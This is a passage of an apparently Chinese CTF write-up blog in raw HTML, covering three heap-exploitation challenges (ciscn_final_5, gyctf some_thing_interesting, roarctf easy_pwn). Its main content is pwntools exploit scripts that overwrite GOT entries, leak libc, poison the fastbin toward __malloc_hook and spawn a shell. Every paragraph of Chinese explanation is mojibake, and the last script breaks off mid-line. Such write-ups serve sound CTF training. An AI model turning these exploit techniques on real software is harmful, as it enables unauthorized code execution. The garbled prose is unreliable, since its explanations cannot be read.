alt=""></p><p>è¿™ä¸ªå‡½æ•°ä¼šå°†content[i]ä¸0xfæŒ‰ä½ä¸ï¼Œå½“content[i]&amp;0xf==indexæ—¶ï¼Œå°±å¾€content[i]&amp;0xFFFFFFFFFFFFFFF0å¤„å†™æ•°æ®ï¼Œå…ˆè´´ä¸Šexp:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#r = remote("node3.buuoj.cn", 28849)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ciscn_final_5"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"ciscn_final_5"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0x6020e0</span>free_got <span class="token operator">=</span> <span class="token number">0x602018</span>puts_plt <span class="token operator">=</span> <span class="token number">0x400790</span>puts_got <span class="token operator">=</span> <span class="token number">0x602020</span>atoi_got <span class="token operator">=</span> <span class="token number">0x602078</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">'aa\n'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> <span class="token string">'aaa\n'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>atoi_got<span class="token number">-4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">17</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>puts <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"puts:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>é€šè¿‡æ„é€ overlapï¼Œæˆ‘ä»¬å°†chunkåˆ†é…åˆ°äº†contentæ•°ç»„å¤„ï¼Œå¹¶å°†contentå‰å‡ ä¸ªå€¼ä¿®æ”¹ä¸ºäº†<strong>p64(free_got)+p64(puts_got+1)+p64(atoi_got-4)</strong></p><p>ç„¶åæˆ‘ä»¬éœ€è¦å°†<strong>free@got</strong>ä¿®æ”¹ä¸ºputså‡½æ•°ï¼Œæ ¹æ®editçš„è¦æ±‚ï¼Œæˆ‘ä»¬è¾“å…¥indexä¸º8ï¼Œ<strong>content[0]=free@got=0x602018,0x602018&amp;0xf=8==index,0x602018&amp;0xFFFFFFFFFFFFFFF0=0x602010</strong>,æ‰€ä»¥æœ€ç»ˆæˆ‘ä»¬æ˜¯å¾€0x602010å¤„å†™æ•°æ®ï¼Œäºæ˜¯ä¼ å…¥ä¸¤ä¸ª<strong>puts_plt</strong>ï¼Œå°†<strong>free@got</strong>ä¿®æ”¹ä¸º<strong>put_plt</strong>ï¼Œç„¶ådelete(1),ç›¸å½“äºputs(1),ç”±äºputs@gotçš„æœ€åä¸€ä½æ˜¯0ï¼Œå¾®è°ƒä¸€ä¸‹+1ï¼Œåé¢çš„å°±æ˜¯ä¿®æ”¹<strong>atoi</strong>ä¸º<strong>system</strong>ï¼Œæ­¥éª¤å’Œå‰é¢ä¿®æ”¹free@gotå·®ä¸å¤šã€‚</p><h2 id="0x7-gyctf-2020-some-thing-interesting"><a href="#0x7-gyctf-2020-some-thing-interesting" class="headerlink" title="0x7.gyctf_2020_some_thing_interesting"></a>0x7.gyctf_2020_some_thing_interesting</h2><p>è™½ç„¶ä¿æŠ¤å…¨å¼€ï¼Œä½†æ˜¯æ— ä»€ä¹ˆéš¾åº¦ï¼Œå­˜åœ¨uafï¼Œå¹¶ä¸”è¿˜ç»™äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²åœ°å€ï¼Œæ‰€ä»¥å…ˆæ³„éœ²åœ°å€ç„¶åuafæ‰“malloc_hookï¼Œexpå¦‚ä¸‹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io = process('./gyctf_2020_some_thing_interesting')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29702</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'gyctf_2020_some_thing_interesting'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size0<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> sizere<span class="token punctuation">,</span> datare<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size0<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data0<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sizere<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>datare<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data0<span class="token punctuation">,</span> datare<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data0<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>datare<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'OreOOrereOOreO%17$p'</span><span class="token punctuation">)</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'OreOOrereOOreO'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">240</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__libc_realloc_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x23</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xb</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__libc_realloc_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">': '</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0x8-roarctf-2019-easy-pwn"><a href="#0x8-roarctf-2019-easy-pwn" class="headerlink" title="0x8.roarctf_2019_easy_pwn"></a>0x8.roarctf_2019_easy_pwn</h2><p>ä¿æŠ¤å…¨å¼€ï¼Œå››ä¸ªåŠŸèƒ½ï¼Œå¢åˆ æŸ¥æ”¹ï¼Œåœ¨editåŠŸèƒ½ä¸­å­˜åœ¨off-by-oneï¼Œå½“æˆ‘ä»¬è¾“å…¥çš„è¦ä¿®æ”¹çš„new_size==old_size+10æ—¶ï¼Œå°±ä¼šäº§ç”Ÿä¸€ä¸ªoff-by-one</p><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/22.jpg" alt=""></p><p>ç”±äºç¨‹åºä½¿ç”¨çš„æ˜¯callocï¼Œcallocä¼šæ¸…ç©ºç”³è¯·è¿‡æ¥çš„chunkçš„å†…å®¹ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ç”³è¯·ä¸€ä¸ªå¤§å°åœ¨unsortedbinä¸­çš„chunkç„¶åfreeå†ç”³è¯·å›æ¥çš„æ–¹æ³•æ³„éœ²åœ°å€ï¼Œäºæ˜¯æˆ‘ä»¬è¦æ„é€ å¤„å †å—å¤ç”¨ï¼Œä¹‹åå†åˆ©ç”¨ä¸€æ¬¡å †å—å¤ç”¨é€ æˆfastbinattackï¼Œå³ç”±chunk0æº¢å‡ºåˆ°chunk1ï¼Œä½¿chunk1çš„å¤§å°è¢«ä¿®æ”¹ä¸ºchunk1_size+chunk2_sizeï¼Œä¹‹åfree chunk1ï¼Œäºæ˜¯æŠŠchunk2ä¹Ÿæ”¾å…¥äº†binä¸­ï¼Œç„¶ååœ¨åˆ†ä¸¤æ¬¡æŠŠchunk1å’Œchunk2ç”³è¯·å›æ¥ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬ç¬¬äºŒæ¬¡ç”³è¯·è¿‡æ¥çš„chunk2æ—¢æ˜¯chunk2ä¹Ÿæ˜¯å¦ä¸€ä¸ªå †å—ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºchunknï¼Œchunk2å’Œchunknå…¬ç”¨ä¸€ä¸ªchunkï¼Œæˆ‘ä»¬freeæ‰chunk2ï¼Œedit chunknï¼Œå®é™…ä¸Šä¹Ÿå°±æ˜¯åœ¨editchunk2ï¼Œä¿®æ”¹chunk2çš„fdæŒ‡å‘malloc_hook-0x23å³å¯ï¼Œexpå¦‚ä¸‹:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./roarctf_2019_easy_pwn'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./roarctf_2019_easy_pwn'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'roarctf_2019_easy_pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># r = remote('node3.buuoj.cn', 25724)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token operator">+</span><span class="token number">0xa</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c4b78</span>__malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>__libc_realloc <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_realloc'</span><span class="token punctuation">]</span>onegadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x4526a</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'__libc_realloc => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>__libc_realloc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>__malloc_hook<span class="token number">-0x23</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span 